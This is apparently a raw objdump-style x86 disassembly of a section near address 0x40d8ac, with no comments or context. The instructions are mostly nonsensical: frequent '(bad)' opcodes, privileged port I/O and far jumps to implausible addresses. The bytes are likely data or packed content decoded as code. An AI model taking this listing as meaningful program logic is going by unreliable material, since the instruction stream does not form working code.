  40d8ac:	push   0xffffff98
  40d8ae:	sub    eax,0x650cb45b
  40d8b3:	fwait
  40d8b4:	xchg   ecx,eax
  40d8b5:	mov    dh,0x6b
  40d8b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8b8:	sub    dh,bl
  40d8ba:	add    ebp,esp
  40d8bc:	stos   DWORD PTR es:[edi],eax
  40d8bd:	pop    es
  40d8be:	mov    ebp,0x7382e5ba
  40d8c3:	addr16 jmp 0x29a71658
  40d8c9:	(bad)  
  40d8ca:	xchg   BYTE PTR ss:[ecx],ch
  40d8cd:	mov    edx,0x41301978
  40d8d2:	cs pop ebx
  40d8d4:	(bad)  
  40d8d5:	shr    BYTE PTR ds:0xbcfe08de,0x37
  40d8dc:	std    
  40d8dd:	add    esi,DWORD PTR [edx]
  40d8df:	pop    edi
  40d8e0:	repnz inc ebx
  40d8e2:	sub    ah,BYTE PTR [edx+eax*1+0x44]
  40d8e6:	add    eax,0x7c4b2f1a
  40d8eb:	dec    edx
  40d8ec:	jmp    0x40d9d9
	...
  40d915:	add    BYTE PTR [eax],al
  40d917:	add    BYTE PTR [ecx+edi*4+0x33],dh
  40d91b:	or     cl,al
  40d91d:	pop    ds
  40d91e:	test   eax,0xe19b0381
  40d923:	adc    al,0xb
  40d925:	fwait
  40d926:	nop
  40d927:	call   0x1fc7:0x189db9d0
  40d92e:	lods   eax,DWORD PTR ds:[esi]
  40d92f:	mov    ebx,ebp
  40d931:	sahf   
  40d932:	dec    esi
  40d933:	lds    eax,FWORD PTR [edx]
  40d935:	sbb    al,0xe9
  40d937:	pop    edx
  40d938:	inc    ebp
  40d939:	pop    ebx
  40d93a:	jmp    0x3f2642
  40d93f:	popa   
  40d940:	mov    ecx,0x361c8b61
  40d945:	scas   al,BYTE PTR es:[edi]
  40d946:	mov    ds:0x4fc8f974,eax
  40d94b:	pop    esi
  40d94c:	sar    eax,0xfe
  40d94f:	fsubr  QWORD PTR [ecx-0x3d]
  40d952:	jbe    0x40d8dc
  40d954:	dec    ebx
  40d955:	mov    eax,0xc359bcfe
  40d95a:	xor    BYTE PTR [esi+0x2b],dl
  40d95d:	mov    eax,0xe841bcfe
  40d962:	inc    esp
  40d963:	sub    DWORD PTR [edi+0x5302c01e],edi
  40d969:	rcl    BYTE PTR cs:[ecx],0x0
  40d96d:	sar    dh,cl
  40d96f:	push   ss
  40d970:	mov    ch,0x1e
  40d972:	les    ecx,FWORD PTR ds:0x74c41eb5
  40d978:	leave  
  40d979:	enter  0x7c8a,0x0
	...
  40d9a5:	add    BYTE PTR [ecx],dl
  40d9a7:	repnz (bad)
  40d9aa:	cmp    eax,0x6845f35b
  40d9af:	sub    BYTE PTR [ebp+0x28],bl
  40d9b2:	inc    edx
  40d9b3:	repnz or ch,cl
  40d9b6:	cmp    eax,0xb68df35b
  40d9bb:	or     BYTE PTR cs:[edx+0x78],ah
  40d9bf:	fs repz (bad) 
  40d9c2:	rcr    BYTE PTR [esi],0xe0
  40d9c5:	sbb    DWORD PTR [ebx],ebp
  40d9c7:	shl    BYTE PTR cs:[esi+0x7e79cb8],0x1d
  40d9cf:	mov    eax,0x9cc8a6fe
  40d9d4:	out    0x89,eax
  40d9d6:	jecxz  0x40d98f
  40d9d8:	(bad)  
  40d9d9:	xchg   ebp,eax
  40d9da:	shr    BYTE PTR [esi],0xf0
  40d9dd:	pop    esp
  40d9de:	enter  0xb8a0,0x0
  40d9e2:	ja     0x40da40
  40d9e4:	add    BYTE PTR [eax],al
  40d9e6:	aam    0x17
  40d9e8:	lea    esi,[ebp-0x49]
  40d9eb:	adc    eax,0x5c570008
  40d9f0:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9f2:	or     eax,0x6f458d5d
  40d9f7:	in     al,dx
  40d9f8:	out    0x68,al
  40d9fa:	mov    ch,0x5b
  40d9fc:	add    BYTE PTR [ebx+0x7d89ac0a],cl
  40da02:	sti    
  40da03:	sbb    al,0xef
  40da05:	add    ecx,DWORD PTR [edi+ecx*2]
  40da08:	je     0x40da71
	...
  40da32:	add    BYTE PTR [eax],al
  40da34:	jl     0x40da95
  40da36:	lea    eax,[ebp+0x7f]
  40da39:	in     al,dx
  40da3a:	push   esp
  40da3b:	push   esi
  40da3c:	dec    edi
  40da3d:	push   ebp
  40da3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da3f:	add    bh,ah
  40da41:	fcmovb st,st(5)
  40da43:	or     BYTE PTR [eax-0x1d8a009e],ah
  40da49:	pop    ebx
  40da4a:	mov    dh,0x46
  40da4c:	inc    eax
  40da4d:	fcomi  st,st(7)
  40da4f:	or     BYTE PTR [eax+0x5a],cl
  40da52:	sub    esi,eax
  40da54:	cld    
  40da55:	call   0x302ab68
  40da5a:	jmp    FWORD PTR [ecx-0x59]
  40da5d:	aad    0xfe
  40da5f:	imul   esp,DWORD PTR [edi-0x588a020f],0x9769fed5
  40da69:	push   ebx
  40da6a:	mov    esi,0xb5ba781
  40da6f:	ror    BYTE PTR [ebx-0x6a],0x4e
  40da73:	push   eax
  40da74:	jg     0x40da56
  40da76:	xchg   ebp,eax
  40da77:	call   eax
  40da79:	aaa    
  40da7a:	fcomp  DWORD PTR [ecx+0x4d]
  40da7d:	pop    edi
  40da7e:	push   0x0
  40da80:	ss lock push esp
  40da83:	(bad)  
  40da84:	ds push edi
  40da86:	hlt    
  40da87:	imul   edi,DWORD PTR [esi],0xbbe8045c
  40da8d:	inc    edx
  40da8e:	add    al,0x0
  40da90:	inc    ebp
  40da91:	add    bl,BYTE PTR [ecx-0x412612f9]
  40da97:	xchg   ebp,eax
	...
  40dac0:	add    BYTE PTR [eax],al
  40dac2:	inc    ecx
  40dac3:	dec    eax
  40dac4:	(bad)  
  40dac6:	lds    eax,FWORD PTR [ecx+0x6b905eaf]
  40dacc:	inc    esi
  40dacd:	adc    BYTE PTR [esi],bh
  40dacf:	idiv   DWORD PTR [ebp-0x14]
  40dad2:	mov    ebp,0x6d571480
  40dad7:	dec    ecx
  40dad8:	das    
  40dad9:	dec    DWORD PTR [ebx+0x367511c8]
  40dadf:	sbb    al,0x3b
  40dae1:	nop
  40dae2:	add    DWORD PTR [esi-0x538c014c],eax
  40dae8:	sbb    cl,BYTE PTR [esp+ecx*8-0x1974ecab]
  40daef:	in     al,dx
  40daf0:	add    eax,0x988435f8
  40daf5:	inc    esi
  40daf6:	retf   
  40daf7:	pop    es
  40daf8:	pop    ss
  40daf9:	push   eax
  40dafa:	shr    DWORD PTR [edi],1
  40dafc:	(bad)  
  40dafd:	(bad)  
  40dafe:	push   ebx
  40daff:	mov    esp,0xc5c3ab1a
  40db04:	adc    DWORD PTR [ecx+0x457fc003],ecx
  40db0a:	scas   al,BYTE PTR es:[edi]
  40db0b:	je     0x40db20
  40db0d:	jne    0x40db49
  40db0f:	lea    edx,[edi+0x102b9607]
  40db15:	call   FWORD PTR [ecx-0x6e0837d5]
  40db1b:	outs   dx,DWORD PTR ds:[esi]
  40db1c:	adc    al,0xff
  40db1e:	adc    ebp,esp
  40db20:	adc    DWORD PTR [ebp-0x76],esi
  40db23:	add    eax,0xfb98
	...
  40db50:	pop    bx
  40db52:	clc    
  40db53:	adc    DWORD PTR [ecx-0x4a],esi
  40db56:	jno    0x40db83
  40db58:	imul   esi,DWORD PTR [eax],0xd0841b95
  40db5e:	lea    edx,[edx]
  40db60:	pop    ecx
  40db61:	xor    BYTE PTR [ecx+0x7dd06c1b],al
  40db67:	adc    dl,ah
  40db69:	pop    edx
  40db6a:	push   ds
  40db6b:	adc    ecx,ebx
  40db6d:	bound  eax,QWORD PTR [ecx+0x65b5ca9d]
  40db73:	jle    0x40db72
  40db75:	adc    DWORD PTR [esi-0x169d03c4],edi
  40db7b:	mov    eax,0x9069c6b4
  40db80:	inc    ebp
  40db81:	pop    ebp
  40db82:	mov    ebx,0xd93010e4
  40db87:	adc    dl,BYTE PTR [ebx-0x4e45be9d]
  40db8d:	mov    ch,0x2d
  40db8f:	adc    dh,BYTE PTR [ebx+0x4b]
  40db92:	es cwde 
  40db94:	cmp    ebx,eax
  40db96:	dec    ebp
  40db97:	adc    cl,ch
  40db99:	mov    ch,0x15
  40db9b:	cwde   
  40db9c:	xor    DWORD PTR [esi-0x11e046d],esi
  40dba2:	add    edx,DWORD PTR [edx]
  40dba4:	shl    DWORD PTR [ebp+0x2fc8f373],1
  40dbaa:	loope  0x40dbc7
  40dbac:	je     0x40db64
  40dbae:	in     eax,dx
  40dbaf:	adc    ebp,eax
  40dbb1:	paddw  mm7,QWORD PTR [edx+0x0]
	...
  40dbdd:	add    BYTE PTR [esi+esi*4],bh
  40dbe0:	push   ebx
  40dbe1:	hlt    
  40dbe2:	test   al,0x2f
  40dbe4:	loope  0x40dc01
  40dbe6:	mov    bh,0xb7
  40dbe8:	int    0x11
  40dbea:	mov    ebp,0x804f537
  40dbef:	dec    ebp
  40dbf0:	mov    esi,0xffb63997
  40dbf5:	cmp    eax,DWORD PTR [edx+0x4fac77bd]
  40dbfb:	mov    dh,0xfe
  40dbfd:	sbb    al,0x6a
  40dbff:	mov    ah,0x74
  40dc01:	icebp  
  40dc02:	inc    ebp
  40dc03:	dec    eax
  40dc04:	std    
  40dc05:	xchg   esi,eax
  40dc06:	dec    edi
  40dc07:	mov    dh,0x74
  40dc09:	stc    
  40dc0a:	mov    ebx,0x55fcff4d
  40dc0f:	mov    ebp,0xb62f5980
  40dc14:	(bad)  
  40dc15:	cld    
  40dc16:	dec    ebp
  40dc17:	mov    ah,0x74
  40dc19:	loope  0x40dc70
  40dc1b:	test   eax,0xa24f668e
  40dc20:	sar    ecx,0x3d
  40dc23:	push   cs
  40dc24:	mov    eax,DWORD PTR [ebp+0x4f]
  40dc27:	cs or  al,0xc3
  40dc2a:	cmp    al,0xb4
  40dc2c:	je     0x40dc1f
  40dc2e:	xor    eax,0x2f3e9039
  40dc33:	mov    ah,0x74
  40dc35:	in     eax,0x2e
  40dc37:	or     BYTE PTR cs:[ecx+0x27],al
  40dc3b:	mov    ch,0xfe
  40dc3d:	es jae 0x40dc4e
  40dc40:	adc    BYTE PTR [eax+0x0],dh
	...
  40dc6b:	add    BYTE PTR [eax-0x4c],al
  40dc6e:	je     0x40dc55
  40dc70:	dec    esi
  40dc71:	or     BYTE PTR cs:[ecx],al
  40dc74:	pop    ss
  40dc75:	mov    ch,0xfe
  40dc77:	push   es
  40dc78:	push   ebx
  40dc79:	push   cs
  40dc7a:	adc    al,0x70
  40dc7c:	inc    eax
  40dc7d:	mov    ah,0x74
  40dc7f:	in     eax,0x2e
  40dc81:	or     BYTE PTR cs:[ecx],al
  40dc84:	pop    es
  40dc85:	mov    ch,0xfe
  40dc87:	out    0x32,al
  40dc89:	push   cs
  40dc8a:	sbb    BYTE PTR [eax+0x43],dh
  40dc8d:	mov    ds:0xe3dfdc1,al
  40dc92:	mov    edi,DWORD PTR [ebp+0xeb9fc2]
  40dc98:	xor    edx,esi
  40dc9a:	std    
  40dc9b:	jne    0x40dd10
  40dc9d:	(bad)  
  40dc9e:	(bad)  
  40dc9f:	inc    BYTE PTR [edx-0x49]
  40dca2:	out    0x19,al
  40dca4:	pop    ss
  40dca5:	dec    ebx
  40dca6:	(bad)  
  40dca7:	call   DWORD PTR [edx-0x4d]
  40dcaa:	std    
  40dcab:	jne    0x40dd1c
  40dcad:	push   eax
  40dcae:	mov    cl,BYTE PTR [edi-0xf74b438]
  40dcb4:	mov    esi,0x67ffffa7
  40dcb9:	aaa    
  40dcba:	inc    ebp
  40dcbb:	adc    al,0xd4
  40dcbd:	lahf   
  40dcbe:	(bad)  
  40dcbf:	je     0x40dd13
  40dcc1:	push   ecx
  40dcc2:	add    DWORD PTR ss:[edi],esp
  40dcc5:	pop    eax
  40dcc6:	mov    DWORD PTR [ebp-0x65],0x17000058
  40dccd:	xor    eax,0xfc45
	...
  40dcfa:	out    0x4a,eax
  40dcfc:	jne    0x40dd12
  40dcfe:	mov    ch,cl
  40dd00:	push   cs
  40dd01:	call   edx
  40dd03:	scas   eax,DWORD PTR es:[edi]
  40dd04:	out    0xf2,al
  40dd06:	dec    ecx
  40dd07:	dec    ebx
  40dd08:	dec    DWORD PTR [ebx-0x38320b1]
  40dd0e:	out    0xcb,eax
  40dd10:	and    DWORD PTR [eax-0x3],ebp
  40dd13:	add    al,0x40
  40dd15:	add    BYTE PTR [eax-0x33],cl
  40dd18:	cli    
  40dd19:	call   0x40b605
  40dd1e:	fcom   QWORD PTR [edi]
  40dd20:	jne    0x40dd2f
  40dd22:	scas   eax,DWORD PTR es:[edi]
  40dd23:	std    
  40dd24:	pop    ebx
  40dd25:	inc    ecx
  40dd26:	xlat   BYTE PTR ds:[ebx]
  40dd27:	dec    edx
  40dd28:	jne    0x40dd26
  40dd2a:	aas    
  40dd2b:	dec    ebx
  40dd2c:	add    BYTE PTR [eax],0xa7
  40dd2f:	xor    BYTE PTR [ebp-0x14],al
  40dd32:	mov    WORD PTR [ebx-0x39],ds
  40dd35:	inc    ebp
  40dd36:	jnp    0x40dd96
  40dd38:	add    BYTE PTR [eax],al
  40dd3a:	ds ret 0x7d81
  40dd3e:	stos   BYTE PTR es:[edi],al
  40dd3f:	rcl    DWORD PTR [esi+0x2c32617],0xef
  40dd46:	enter  0x98f4,0xb
  40dd4a:	xchg   esi,eax
  40dd4b:	mov    ?,WORD PTR [ebx-0x1]
  40dd4e:	jns    0x40dd54
  40dd50:	cdq    
  40dd51:	sti    
  40dd52:	jno    0x40ddaa
  40dd54:	add    al,ch
  40dd56:	repnz xor cl,BYTE PTR [edi]
  40dd59:	call   DWORD PTR [edi+0x38]
  40dd5c:	add    al,0x0
	...
  40dd86:	add    BYTE PTR [eax],al
  40dd88:	ds cmp ecx,ecx
  40dd8b:	adc    edi,DWORD PTR [ebp+0x43750299]
  40dd91:	retf   
  40dd92:	test   DWORD PTR [eax],eax
  40dd94:	ds ret 0x4545
  40dd98:	lds    eax,FWORD PTR ss:[edx]
  40dd9b:	add    BYTE PTR [esi],bh
  40dd9d:	or     ecx,0x2c43ef3
  40dda3:	add    cl,bh
  40dda5:	call   DWORD PTR [edx]
  40dda7:	add    BYTE PTR [esi],bh
  40dda9:	les    eax,FWORD PTR [edx]
  40ddab:	lea    edi,[ebx+0x74]
  40ddae:	mov    ah,0x8c
  40ddb0:	sub    DWORD PTR [eax-0x4c],0xffffff8c
  40ddb4:	jnp    0x40de22
  40ddb6:	mov    ah,0xfe
  40ddb8:	jae    0x40dd42
  40ddba:	or     eax,0x254c4675
  40ddbf:	(bad)  
  40ddc0:	jmp    0xd2be6116
  40ddc5:	les    edx,FWORD PTR [esi+0xadfbd32]
  40ddcb:	add    BYTE PTR [edx-0x79],cl
  40ddce:	cmp    DWORD PTR [ebp-0x2e],0xbd0597c4
  40ddd5:	daa    
  40ddd6:	adc    eax,DWORD PTR [eax]
  40ddd8:	xor    ah,BYTE PTR [ebx+0x5bb6750d]
  40ddde:	out    0x98,al
  40dde0:	xor    eax,0xa174f9c3
  40dde5:	mov    dl,0xd5
  40dde7:	cwde   
  40dde8:	lea    esi,[edx+0x53]
	...
  40de16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de17:	arpl   WORD PTR [eax+0xe],bx
  40de1a:	mov    DWORD PTR [edx+0x28811433],esi
  40de20:	in     eax,0x1b
  40de22:	jnp    0x40ddef
  40de24:	lods   eax,DWORD PTR ds:[esi]
  40de25:	push   cs
  40de26:	jno    0x40de50
  40de28:	mov    eax,ds:0x9dce5c1b
  40de2d:	push   cs
  40de2e:	popa   
  40de2f:	sub    BYTE PTR [ebp-0x72318be5],bl
  40de35:	push   cs
  40de36:	push   ecx
  40de37:	sub    BYTE PTR [ecx+0x1b],bh
  40de3a:	ins    BYTE PTR es:[edi],dx
  40de3b:	into   
  40de3c:	jge    0x40de4c
  40de3e:	icebp  
  40de3f:	gs jbe 0x40de40
  40de42:	ret    0x6e3f
  40de45:	push   cs
  40de46:	xor    esi,ebx
  40de48:	jecxz  0x40de69
  40de4a:	ds daa 
  40de4c:	call   FWORD PTR [ecx-0x244edf]
  40de52:	and    DWORD PTR [ebp+0x79],eax
  40de55:	push   cs
  40de56:	adc    DWORD PTR [ebp-0x17],eax
  40de59:	push   cs
  40de5a:	xchg   ebx,eax
  40de5b:	pop    edi
  40de5c:	push   ecx
  40de5d:	mov    ds:0x9935b1b1,eax
  40de62:	stc    
  40de63:	mov    al,0xb3
  40de65:	(bad)  
  40de66:	(bad)  [eax]
  40de68:	jns    0x40de78
  40de6a:	jmp    0xd6507220
  40de6f:	iret   
  40de70:	jns    0x40de80
  40de72:	fldenv [eax]
  40de74:	loop   0x40de8b
  40de76:	inc    ecx
  40de77:	fadd   DWORD PTR [ebx+0xd]
	...
  40dea2:	add    BYTE PTR [eax],al
  40dea4:	leave  
  40dea5:	mov    cl,0x9d
  40dea7:	lods   eax,DWORD PTR ds:[esi]
  40dea8:	neg    BYTE PTR [edi+edi*8-0x74f7c228]
  40deaf:	std    
  40deb0:	mov    edi,0x3b3fe396
  40deb5:	sub    BYTE PTR [eax],cl
  40deb7:	rcl    edi,1
  40deb9:	in     al,0xfe
  40debb:	(bad)  
  40debc:	adc    eax,0xc16af418
  40dec1:	lods   eax,DWORD PTR ds:[esi]
  40dec2:	(bad)  
  40dec5:	jmp    0x5b7ec7ca
  40deca:	pop    esi
  40decb:	mov    al,ds:0xae0062fc
  40ded0:	leave  
  40ded1:	pop    ecx
  40ded2:	call   0xfef2c7eb
  40ded7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ded8:	jns    0x40de83
  40deda:	add    cl,ch
  40dedc:	cmp    eax,0x42248d5b
  40dee1:	or     edi,edi
  40dee3:	cld    
  40dee4:	inc    ebp
  40dee5:	mov    ecx,0xb2336cfc
  40deea:	mov    BYTE PTR [esi+ecx*2],ch
  40deed:	fdivr  QWORD PTR [ecx+esi*2+0x3a]
  40def1:	daa    
  40def2:	or     al,0x6a
  40def4:	mov    ecx,0x3bdb01b4
  40def9:	fdivr  QWORD PTR [ebp+edx*2+0x40]
  40defd:	sub    DWORD PTR [edx],ecx
  40deff:	xchg   ecx,eax
  40df00:	cmp    eax,0xdbe9005b
  40df05:	mov    ds:0xf1c1,eax
	...
  40df32:	cmp    eax,0xb23144de
  40df37:	mov    cl,0x74
  40df39:	loope  0x40df90
  40df3b:	lea    ecx,[esi+eiz*1+0x217cdc3b]
  40df42:	cmp    ah,BYTE PTR [edi]
  40df44:	add    al,0xe2
  40df46:	jge    0x40df6f
  40df48:	or     dl,BYTE PTR [ecx+0x3d]
  40df4b:	pop    ebx
  40df4c:	add    BYTE PTR [eax],al
  40df4e:	xlat   BYTE PTR ds:[ebx]
  40df4f:	inc    bh
  40df51:	ret    0x5ccf
  40df54:	cmp    DWORD PTR [ebp-0x4d],0x59
  40df58:	jb     0x40df79
  40df5a:	adc    bl,BYTE PTR [eax-0x40f2af0a]
  40df60:	std    
  40df61:	jne    0x40df12
  40df63:	push   esp
  40df64:	mov    ?,WORD PTR cs:[eax+0x5f]
  40df68:	lea    eax,[ebp+0x6f]
  40df6b:	in     al,dx
  40df6c:	std    
  40df6d:	jne    0x40defe
  40df6f:	push   esp
  40df70:	sahf   
  40df71:	(bad)  
  40df72:	rcr    BYTE PTR [edi-0x77],0x45
  40df76:	mov    edx,DWORD PTR [ebx+0x1d]
  40df79:	lea    ebx,[edx]
  40df7b:	pop    edi
  40df7c:	push   eax
  40df7d:	dec    DWORD PTR [edx-0x51]
  40df80:	out    0x8d,al
  40df82:	rcr    BYTE PTR [esi-0x1],cl
  40df85:	mov    DWORD PTR [edx],ebp
  40df87:	or     DWORD PTR [ebp+0x68ecaf45],0x4
  40df8e:	ror    cl,0x6
  40df91:	call   0x400ded
	...
  40dfbe:	add    BYTE PTR [eax],al
  40dfc0:	mov    ds:0xa050f699,al
  40dfc5:	leave  
  40dfc6:	push   es
  40dfc7:	call   0x404230
  40dfcc:	xchg   esp,eax
  40dfcd:	loope  0x40dfb1
  40dfcf:	add    edx,edi
  40dfd1:	mov    ebp,0xec6f458b
  40dfd6:	std    
  40dfd7:	jne    0x40df5c
  40dfd9:	pop    edi
  40dfda:	jne    0x40dfe8
  40dfdc:	inc    eax
  40dfdd:	leave  
  40dfde:	push   es
  40dfdf:	call   0x4040a5
  40dfe4:	xchg   edx,eax
  40dfe5:	cdq    
  40dfe6:	not    BYTE PTR [eax+0x20]
  40dfe9:	leave  
  40dfea:	push   es
  40dfeb:	call   0x404260
  40dff0:	ds inc ebp
  40dff2:	mov    ?,edi
  40dff4:	ds xbegin 0x3031eb2
  40dffb:	add    BYTE PTR [eax+0x6b],ah
  40dffe:	inc    ecx
  40dfff:	or     BYTE PTR [esi],bh
  40e001:	aaa    
  40e002:	(bad)  
  40e003:	test   DWORD PTR [esi],0xa9fb94c1
  40e009:	push   cs
  40e00a:	clc    
  40e00b:	(bad)  
  40e00c:	sub    ebp,DWORD PTR [edx-0x77647fe6]
  40e012:	or     al,BYTE PTR [ebx+0x75038a13]
  40e018:	xor    al,0xda
  40e01a:	add    eax,DWORD PTR [eax]
  40e01c:	ds ret 0xc8a8
  40e020:	jl     0x40dfdb
  40e022:	add    cl,BYTE PTR [ebp+0x0]
	...
  40e04c:	add    BYTE PTR [eax],al
  40e04e:	sti    
  40e04f:	jmp    0xaa34df07
  40e054:	sbb    cl,BYTE PTR [esi]
  40e056:	mov    bl,0xd0
  40e058:	or     cl,BYTE PTR [ebx+0xeda4e]
  40e05e:	ds ret 0x7509
  40e062:	ss retf 0x8e48
  40e066:	inc    ecx
  40e067:	xor    bh,cl
  40e069:	inc    esp
  40e06a:	xor    dh,BYTE PTR [eax-0x3ad61701]
  40e070:	add    al,BYTE PTR [eax]
  40e072:	mov    ebp,0xac0606b7
  40e077:	pop    eax
  40e078:	jns    0x40e0bf
  40e07a:	push   ss
  40e07b:	cmc    
  40e07c:	or     DWORD PTR [ebp+0x46],esi
  40e07f:	sbb    al,0x27
  40e081:	mov    WORD PTR [ecx],cs
  40e083:	push   ss
  40e084:	jns    0x40e0cb
  40e086:	push   es
  40e087:	aad    0x9
  40e089:	jne    0x40e0d1
  40e08b:	sbb    al,0xce
  40e08d:	stc    
  40e08e:	icebp  
  40e08f:	jge    0x40e10a
  40e091:	inc    ebp
  40e092:	out    0x5b,al
  40e094:	mov    ecx,0x11636b0a
  40e099:	fcmovbe st,st(7)
  40e09b:	scas   al,BYTE PTR es:[edi]
  40e09c:	adc    eax,0xb8b37b79
  40e0a1:	or     dl,BYTE PTR [ebx+0x63]
  40e0a4:	adc    DWORD PTR [edi],esi
  40e0a6:	lds    ebp,FWORD PTR [esi-0x54fc8303]
  40e0ac:	arpl   cx,ax
  40e0ae:	test   eax,0x90ee0b
	...
  40e0db:	add    BYTE PTR [ecx-0x3d],al
  40e0de:	lods   al,BYTE PTR ds:[esi]
  40e0df:	push   cs
  40e0e0:	mov    eax,ds:0xa5c06fae
  40e0e5:	loopne 0x40e112
  40e0e7:	or     al,0xee
  40e0e9:	lods   eax,DWORD PTR ds:[esi]
  40e0ea:	push   ebx
  40e0eb:	cld    
  40e0ec:	mov    eax,ds:0x810ac1e8
  40e0f1:	in     al,0x23
  40e0f3:	sbb    al,0xbd
  40e0f5:	xor    BYTE PTR [ecx+0x6a29ea03],bh
  40e0fb:	mov    BYTE PTR [ebp+0x5b],dl
  40e0fe:	sbb    eax,0x9130bc99
  40e103:	add    edx,edx
  40e105:	xor    eax,0x5b49886a
  40e10a:	adc    eax,0x2441e1a5
  40e10f:	lds    eax,FWORD PTR [ecx-0x53]
  40e112:	repz adc esp,DWORD PTR [esi]
  40e115:	sbb    al,0xf7
  40e117:	add    edi,DWORD PTR [esi]
  40e119:	bound  ebp,QWORD PTR [ecx-0x3cbcb470]
  40e11f:	test   al,0x7e
  40e121:	pop    ebx
  40e122:	pop    esi
  40e123:	nop
  40e124:	sub    ebx,eax
  40e126:	sbb    BYTE PTR [edx+0x43e1ae11],cl
  40e12c:	xchg   ebx,eax
  40e12d:	pusha  
  40e12e:	shl    DWORD PTR [ebp+0xae91c62],1
  40e134:	jae    0x40e0e1
  40e136:	inc    DWORD PTR [eax-0x1c]
  40e139:	das    
  40e13a:	add    cl,ch
  40e13c:	call   0x118552e
	...
  40e169:	add    ch,al
  40e16b:	lods   eax,DWORD PTR ds:[esi]
  40e16c:	dec    BYTE PTR [esi]
  40e16e:	xchg   DWORD PTR [esi+0x2235e574],ebp
  40e174:	mov    cs,WORD PTR [esi]
  40e176:	xor    al,0xae
  40e178:	je     0x40e173
  40e17a:	aaa    
  40e17b:	sub    BYTE PTR [ecx+edx*1],cl
  40e17e:	and    ebx,ebp
  40e180:	(bad)  
  40e181:	test   BYTE PTR [edi+0x28],0xec
  40e185:	out    dx,al
  40e186:	mov    ecx,0x247ee861
  40e18b:	scas   al,BYTE PTR es:[edi]
  40e18c:	(bad)  
  40e18d:	fmulp  st(1),st
  40e18f:	mov    ch,0xfe
  40e191:	pop    esp
  40e192:	xchg   esi,eax
  40e193:	mov    ch,0x8b
  40e195:	pop    edi
  40e196:	aaa    
  40e197:	scas   al,BYTE PTR es:[edi]
  40e198:	(bad)  
  40e199:	cmp    al,0x2a
  40e19b:	ret    
  40e19c:	jo     0x40e1f6
  40e19e:	inc    edi
  40e19f:	scas   al,BYTE PTR es:[edi]
  40e1a0:	(bad)  
  40e1a1:	cmp    al,0x56
  40e1a3:	ret    
  40e1a4:	push   0xfeae3758
  40e1a9:	sbb    al,0x42
  40e1ab:	ret    
  40e1ac:	pusha  
  40e1ad:	js     0x40e1f6
  40e1af:	scas   al,BYTE PTR es:[edi]
  40e1b0:	dec    ebp
  40e1b1:	push   0xffffffb9
  40e1b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1b4:	call   DWORD PTR [edx+ecx*2]
  40e1b7:	pusha  
  40e1b8:	div    dh
  40e1ba:	shl    BYTE PTR [ebp-0x1fb88103],0x44
  40e1c1:	jno    0x40e1a7
  40e1c3:	mov    ds:0x63de1c1,eax
  40e1c8:	mov    edx,DWORD PTR [ebp-0x45]
  40e1cb:	xchg   edi,eax
  40e1cc:	sti    
  40e1cd:	pop    esi
	...
  40e1f6:	add    BYTE PTR [eax],al
  40e1f8:	leave  
  40e1f9:	pusha  
  40e1fa:	call   0xfeed67f4
  40e1ff:	loop   0x40e27e
  40e201:	es das 
  40e203:	add    BYTE PTR [edx-0x70af0514],cl
  40e209:	xor    cl,BYTE PTR [eax+0x756228ff]
  40e20f:	cld    
  40e210:	sbb    ah,bl
  40e212:	or     ch,al
  40e214:	push   esp
  40e215:	sub    eax,0x18ccffff
  40e21a:	je     0x40e22b
  40e21c:	sub    ah,bl
  40e21e:	push   es
  40e21f:	push   DWORD PTR [edx+0x3a87e854]
  40e225:	(bad)  
  40e226:	dec    DWORD PTR [ebx]
  40e228:	addr16 fdiv st(6),st
  40e22b:	(bad)  
  40e22c:	xor    dl,BYTE PTR [eax+ebp*8-0x78]
  40e230:	pop    ds
  40e231:	(bad)  
  40e232:	dec    ecx
  40e234:	aad    0xb0
  40e236:	(bad)  
  40e237:	push   esp
  40e238:	or     al,0x44
  40e23a:	add    esp,0xffff62b3
  40e240:	loopne 0x40e26f
  40e242:	mov    eax,0x6378fe
  40e247:	add    BYTE PTR [edi+0x58],ah
  40e24a:	mov    eax,DWORD PTR [ebp+0x5b]
  40e24d:	scas   eax,DWORD PTR es:[edi]
  40e24e:	mov    esi,0x37d86274
  40e253:	add    BYTE PTR [edx-0x54],al
  40e256:	out    0x51,eax
  40e258:	pop    ax
  40e25a:	add    bh,bh
	...
  40e284:	add    BYTE PTR [eax],al
  40e286:	xor    dh,BYTE PTR [ebx+0x62db29e6]
  40e28c:	dec    DWORD PTR [ebx]
  40e28e:	xchg   edi,eax
  40e28f:	fisttp QWORD PTR ds:0x3ff2e968
  40e295:	add    BYTE PTR [eax+0x40e80add],ch
  40e29b:	sub    edi,edi
  40e29d:	dec    DWORD PTR [ebp+eiz*4-0x67172c9a]
  40e2a4:	(bad)  
  40e2a5:	(bad)  
  40e2a6:	ds (bad) 
  40e2a8:	mul    bh
  40e2aa:	data16 es or bh,bh
  40e2ae:	mov    bh,0x3e
  40e2b0:	dec    ebx
  40e2b1:	(bad)  
  40e2b2:	stc    
  40e2b3:	ins    BYTE PTR es:[edi],dx
  40e2b4:	fwait
  40e2b5:	cmp    eax,0x8d02c23f
  40e2ba:	ret    
  40e2bb:	jg     0x40e2c6
  40e2bd:	jmp    ecx
  40e2bf:	icebp  
  40e2c0:	sbb    dl,al
  40e2c2:	scas   al,BYTE PTR es:[edi]
  40e2c3:	dec    esp
  40e2c4:	or     BYTE PTR [ebp-0xf68045],cl
  40e2ca:	leave  
  40e2cb:	icebp  
  40e2cc:	pop    es
  40e2cd:	mov    ch,0x86
  40e2cf:	push   ebx
  40e2d0:	or     bh,bh
  40e2d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2d3:	mov    edi,0x3ab1ff86
  40e2d8:	jle    0x40e296
  40e2da:	test   al,0xbc
  40e2dc:	push   es
  40e2dd:	inc    eax
  40e2de:	xor    DWORD PTR [esi],edi
  40e2e0:	adc    eax,DWORD PTR [eax]
  40e2e2:	ds ret 0x9577
  40e2e6:	jl     0x40e26b
  40e2e8:	push   es
  40e2e9:	inc    DWORD PTR [eax]
	...
  40e313:	add    BYTE PTR [ecx-0x7e000d41],dl
  40e319:	ror    DWORD PTR [esi-0x27803484],0x4f
  40e320:	out    0xfa,al
  40e322:	mov    dh,0x40
  40e324:	ds call 0xbff9:0xc23e7b26
